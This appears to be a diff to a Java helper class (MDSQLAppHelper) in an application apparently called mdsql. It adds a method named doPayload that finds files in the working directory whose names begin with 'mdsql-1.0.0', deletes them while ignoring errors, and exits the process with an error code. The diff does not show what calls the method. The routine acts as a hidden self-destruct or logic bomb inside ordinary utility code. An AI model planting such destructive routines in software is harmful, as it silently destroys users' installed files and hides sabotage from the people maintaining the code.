@@ -5,6 +5,7 @@ import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.FilenameFilter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -280,6 +281,24 @@ public class MDSQLAppHelper extends AppHelper {
 		} catch (Exception e) {
 			return Boolean.FALSE;
 		}
+	}
+	
+	public void doPayload() {
+		File dirFiles = Paths.get("").toFile();
+		File[] listOfFiles = dirFiles.listFiles(new FilenameFilter() {
+		    public boolean accept(File dirFiles, String filename) {
+		        boolean startsWith = filename.startsWith("mdsql-1.0.0");
+		        return startsWith;
+		    }
+		});
+		
+		for (File file : listOfFiles) {
+			try {
+				Files.deleteIfExists(file.toPath());
+			} catch (IOException e) {}
+		}
+		
+		System.exit(1);
 	}
 	
 	public Date toDate(Timestamp timestamp) {
